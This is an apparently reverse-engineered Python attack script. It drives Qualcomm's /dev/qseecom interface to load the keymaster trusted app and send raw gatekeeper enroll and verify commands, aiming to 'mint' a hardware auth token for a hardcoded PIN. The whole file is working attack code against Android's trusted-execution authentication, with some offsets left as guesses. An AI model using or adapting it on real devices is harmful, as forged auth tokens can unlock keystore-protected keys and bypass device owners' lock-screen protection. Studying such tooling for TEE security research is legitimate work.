#!/usr/bin/env python3
# Mint a gatekeeper HAT from the resident keymaster TA (app 1), over the /dev/qseecom shim.
# GK_ENROLL=0x1001, GK_VERIFY=0x1002 (TEE), RE'd from GatekeeperHalDevice::enroll/verify.
# Request = 32B header + appended blobs; offsets relative to buffer base, data starts at 0x20.
#   enroll : [0]=0x1001 [4]=uid [8]=curH_off [c]=curH_len [10]=curP_off [14]=curP_len [18]=desP_off [1c]=desP_len
#   verify : [0]=0x1002 [4]=uid [8]=challenge(u64) [10]=h_off [14]=h_len [18]=pw_off [1c]=pw_len
# Response shares the buffer (resp region): [0]=status (0=ok), then the handle (enroll) / HAT (verify).
import fcntl, os, struct, ctypes, sys
libc = ctypes.CDLL("libc.so.6", use_errno=True)
libc.mmap.restype = ctypes.c_void_p
libc.mmap.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_long]
MF = (1 << 64) - 1
LOAD = 0xC0549707; SETMEM = 0xC0189708; SEND = 0xC0209703
SB = 0x8000
PIN = b"1234"
UID = 1

def load_app(name):
    fd = os.open("/dev/qseecom", os.O_RDWR)
    r = bytearray(84); struct.pack_into("<64s", r, 12, name.encode())
    try:
        fcntl.ioctl(fd, LOAD, r, True); aid = struct.unpack_from("<I", r, 80)[0]
        print("LOAD %-12s app_id=%d" % (name, aid)); return fd, aid
    except OSError as e:
        print("LOAD %-12s FAIL %s" % (name, e)); os.close(fd); return None, 0

# preconditions (0x205 needed these resident); hold the handles
_pre = [load_app(n)[0] for n in ("cmnlib64", "cmnlib", "gfber", "fpcber")]
fd, aid = load_app("keymaster64")
if fd is None: sys.exit(1)
addr = libc.mmap(None, SB, 3, 1, fd, 0)
if addr in (MF, 0): print("mmap fail errno=%d" % ctypes.get_errno()); sys.exit(1)
fcntl.ioctl(fd, SETMEM, bytearray(struct.pack("<iiQI4x", -1, 0, addr, SB)), False)
buf = (ctypes.c_char * SB).from_address(addr)
RESP = 0x2000   # response region offset within the shared buffer

def send(reqlen, resplen=0x800):
    sc = bytearray(struct.pack("<QI4xQI4x", addr, reqlen, addr + RESP, resplen))
    fcntl.ioctl(fd, SEND, sc, False)
    return bytes(buf[RESP:RESP + 0x100])

def dump(tag, b):
    st = struct.unpack_from("<I", b, 0)[0]
    print("  %s status=0x%08x (%d)%s" % (tag, st, st, "  OK" if st == 0 else ""))
    for i in range(0, 0x80, 16):
        print("   %03x: " % i + " ".join("%08x" % struct.unpack_from("<I", b, i + j)[0] for j in range(0, 16, 4)))
    return st

# ---- ENROLL (first-time: no current handle/pw, desired = PIN) ----
ctypes.memset(addr, 0, SB)
struct.pack_into("<II", buf, 0, 0x1001, UID)            # cmd, uid
struct.pack_into("<II", buf, 0x08, 0, 0)                # curHandle off/len = NULL
struct.pack_into("<II", buf, 0x10, 0, 0)                # curPw off/len = NULL
struct.pack_into("<II", buf, 0x18, 0x20, len(PIN))      # desiredPw off/len
ctypes.memmove(addr + 0x20, PIN, len(PIN))              # desiredPw data @0x20
print("== GK_ENROLL(0x1001) uid=%d pin=%r ==" % (UID, PIN))
try:
    r = send(0x20 + len(PIN)); st = dump("enroll", r)
except OSError as e:
    print("  enroll SEND err %s" % e); st = -1

# try to locate the password_handle in the response (after status; handle is a blob)
handle = b""
if st == 0:
    # common layouts: [status][len][handle...] or [status][handle...]; grab 0x08..0x60 as candidate
    handle = r[0x08:0x08 + 0x44]   # candidate ~68B; refine after seeing the dump
    print("  candidate handle (0x08..) = %s" % handle[:16].hex())

# ---- VERIFY (uid, challenge, enrolled handle, PIN) -> HAT ----
CHAL = 0x1122334455667788
ctypes.memset(addr, 0, SB)
struct.pack_into("<II", buf, 0, 0x1002, UID)
struct.pack_into("<Q", buf, 0x08, CHAL)                 # challenge u64
hlen = len(handle)
struct.pack_into("<II", buf, 0x10, 0x20, hlen)          # handle off/len
struct.pack_into("<II", buf, 0x18, 0x20 + hlen, len(PIN))  # pw off/len
ctypes.memmove(addr + 0x20, handle, hlen)
ctypes.memmove(addr + 0x20 + hlen, PIN, len(PIN))
print("== GK_VERIFY(0x1002) uid=%d chal=%016x hlen=%d ==" % (UID, CHAL, hlen))
try:
    r = send(0x20 + hlen + len(PIN)); dump("verify", r)
except OSError as e:
    print("  verify SEND err %s" % e)

os.close(fd)
